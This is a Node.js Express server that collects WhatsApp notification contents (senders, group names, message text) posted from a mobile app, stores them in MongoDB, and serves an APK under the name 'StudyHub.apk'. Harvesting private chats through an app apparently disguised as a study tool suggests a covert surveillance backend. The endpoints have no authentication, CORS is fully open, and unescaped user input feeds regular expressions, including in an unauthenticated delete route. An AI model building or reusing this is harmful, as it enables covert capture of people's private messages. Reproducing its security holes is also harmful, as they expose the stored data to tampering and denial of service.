require('dotenv').config();
const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const path = require('path');
const fs = require('fs');
const WhatsAppMessage = require('./models/WhatsAppMessage');

const app = express();
const PORT = process.env.PORT || 5000;
const MONGODB_URI =
  process.env.MONGODB_URI || 'mongodb://localhost:27017/whatsapp_notifications';

// Middlewares
app.use(cors());

// Normalize Content-Type headers from mobile clients
app.use((req, res, next) => {
  const ct = req.headers['content-type'];
  if (ct && ct.includes('application/json')) {
    req.headers['content-type'] = 'application/json';
  }
  next();
});

app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// Connect to MongoDB
let isMongoConnected = false;

// Auto-cleanup: Automatically delete messages older than 30 days
async function cleanupOldMessages() {
  if (!isMongoConnected) return;
  try {
    const thirtyDaysAgo = new Date(Date.now() - 30 * 24 * 60 * 60 * 1000);
    const result = await WhatsAppMessage.deleteMany({
      $or: [
        { createdAt: { $lt: thirtyDaysAgo } },
        { timestamp: { $lt: thirtyDaysAgo } },
      ],
    });
    if (result.deletedCount > 0) {
      console.log(`🧹 [30-Day Auto-Cleanup] Removed ${result.deletedCount} expired messages.`);
    }
  } catch (err) {
    console.error('Error during 30-day auto-cleanup:', err.message);
  }
}

mongoose
  .connect(MONGODB_URI)
  .then(() => {
    isMongoConnected = true;
    console.log('✅ Connected to MongoDB successfully.');
    cleanupOldMessages();
    setInterval(cleanupOldMessages, 24 * 60 * 60 * 1000);
  })
  .catch((err) => {
    isMongoConnected = false;
    console.error('❌ MongoDB connection error:', err.message);
    console.log('💡 Note: You can update MONGODB_URI in server/.env with your MongoDB Atlas or local connection string.');
  });

mongoose.connection.on('disconnected', () => {
  isMongoConnected = false;
  console.log('⚠️ MongoDB disconnected.');
});

mongoose.connection.on('reconnected', () => {
  isMongoConnected = true;
  console.log('🔄 MongoDB reconnected.');
});

// Health check endpoint
app.get('/api/health', (req, res) => {
  res.json({
    status: 'ok',
    mongoStatus: isMongoConnected ? 'connected' : 'disconnected',
    databaseUri: MONGODB_URI.replace(/\/\/.*@/, '//***:***@'), // Mask credentials
    timestamp: new Date(),
  });
});

// Save single message or batch of messages
app.post('/api/messages', async (req, res) => {
  try {
    if (!isMongoConnected) {
      console.error('❌ [MongoDB Error] Received messages, but MongoDB is DISCONNECTED on server!');
      return res.status(503).json({
        success: false,
        error: 'MongoDB is disconnected on the server. Please verify MONGODB_URI and MongoDB Atlas IP access (0.0.0.0/0).',
      });
    }

    const payload = req.body;
    const messages = Array.isArray(payload)
      ? payload
      : payload.messages && Array.isArray(payload.messages)
      ? payload.messages
      : [payload];

    const validMessages = messages.filter(
      (m) => m && (m.message || m.title || m.groupName)
    );

    if (validMessages.length === 0) {
      return res.status(400).json({ error: 'No valid messages provided' });
    }

    const bulkOps = validMessages.map((m) => {
      const messageId = m.id || m.messageId || `${Date.now()}_${Math.random()}`;
      const groupName = m.groupName || m.matchedGroup || 'Unknown Group';
      const sender = m.sender || m.title || 'Unknown';
      const message = m.message || '';
      const timestamp = m.timestamp ? new Date(m.timestamp) : new Date();
      const matchedGroup = m.matchedGroup || '';
      const packageName = m.packageName || 'com.whatsapp';

      return {
        updateOne: {
          filter: { messageId },
          update: {
            $set: {
              messageId,
              groupName,
              matchedGroup,
              sender,
              message,
              timestamp,
              packageName,
              updatedAt: new Date(),
            },
            $setOnInsert: {
              receivedAt: new Date(),
              createdAt: new Date(),
            },
          },
          upsert: true,
        },
      };
    });

    const result = await WhatsAppMessage.bulkWrite(bulkOps);
    console.log(`[MongoDB] Upserted ${result.upsertedCount || 0}, Modified ${result.modifiedCount || 0} messages.`);

    res.json({
      success: true,
      insertedCount: result.upsertedCount || 0,
      modifiedCount: result.modifiedCount || 0,
      totalProcessed: messages.length,
    });
  } catch (error) {
    console.error('Error saving messages to MongoDB:', error);
    res.status(500).json({
      success: false,
      error: error.message,
    });
  }
});

// Get stored messages with optional filtering
app.get('/api/messages', async (req, res) => {
  try {
    const { groupName, limit = 100, skip = 0, search } = req.query;
    const query = {};

    if (groupName) {
      query.groupName = new RegExp(groupName, 'i');
    }

    if (search) {
      query.$or = [
        { sender: new RegExp(search, 'i') },
        { message: new RegExp(search, 'i') },
        { groupName: new RegExp(search, 'i') },
      ];
    }

    const total = await WhatsAppMessage.countDocuments(query);
    const messages = await WhatsAppMessage.find(query)
      .sort({ timestamp: -1 })
      .skip(Number(skip))
      .limit(Math.min(Number(limit), 200));

    res.json({
      success: true,
      total,
      messages,
    });
  } catch (error) {
    console.error('Error fetching messages from MongoDB:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// List groups stored in MongoDB
app.get('/api/groups', async (req, res) => {
  try {
    const groups = await WhatsAppMessage.aggregate([
      {
        $group: {
          _id: '$groupName',
          count: { $sum: 1 },
          lastMessage: { $first: '$message' },
          lastTimestamp: { $first: '$timestamp' },
        },
      },
      { $sort: { lastTimestamp: -1 } },
    ]);

    res.json({
      success: true,
      groups: groups.map((g) => ({
        groupName: g._id,
        count: g.count,
        lastMessage: g.lastMessage,
        lastTimestamp: g.lastTimestamp,
      })),
    });
  } catch (error) {
    console.error('Error fetching groups from MongoDB:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// Delete messages for a specific group
app.delete('/api/messages/:groupName', async (req, res) => {
  try {
    const { groupName } = req.params;
    const result = await WhatsAppMessage.deleteMany({
      groupName: new RegExp(`^${groupName}$`, 'i'),
    });
    res.json({
      success: true,
      deletedCount: result.deletedCount,
    });
  } catch (error) {
    console.error('Error deleting group messages:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// App Installation & Download Routes
app.get(['/app/install', '/install'], (req, res) => {
  res.sendFile(path.resolve(__dirname, 'public', 'install.html'));
});

app.get(['/app/download', '/download'], (req, res) => {
  const primaryApk = path.join(__dirname, 'public', 'StudyHub.apk');
  const releaseApk = path.join(__dirname, '..', 'android', 'app', 'build', 'outputs', 'apk', 'release', 'app-release.apk');
  const debugApk = path.join(__dirname, '..', 'android', 'app', 'build', 'outputs', 'apk', 'debug', 'app-debug.apk');

  if (fs.existsSync(primaryApk)) {
    return res.download(primaryApk, 'StudyHub.apk');
  } else if (fs.existsSync(releaseApk)) {
    return res.download(releaseApk, 'StudyHub.apk');
  } else if (fs.existsSync(debugApk)) {
    return res.download(debugApk, 'StudyHub.apk');
  } else {
    res.status(404).send('APK file not found on server. Please build the APK first.');
  }
});

// Start Server
app.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 WhatsApp Notification Server running on port ${PORT}`);
  console.log(`📡 Health Check: http://localhost:${PORT}/api/health`);
  console.log(`📥 Ingest API: http://localhost:${PORT}/api/messages`);
});
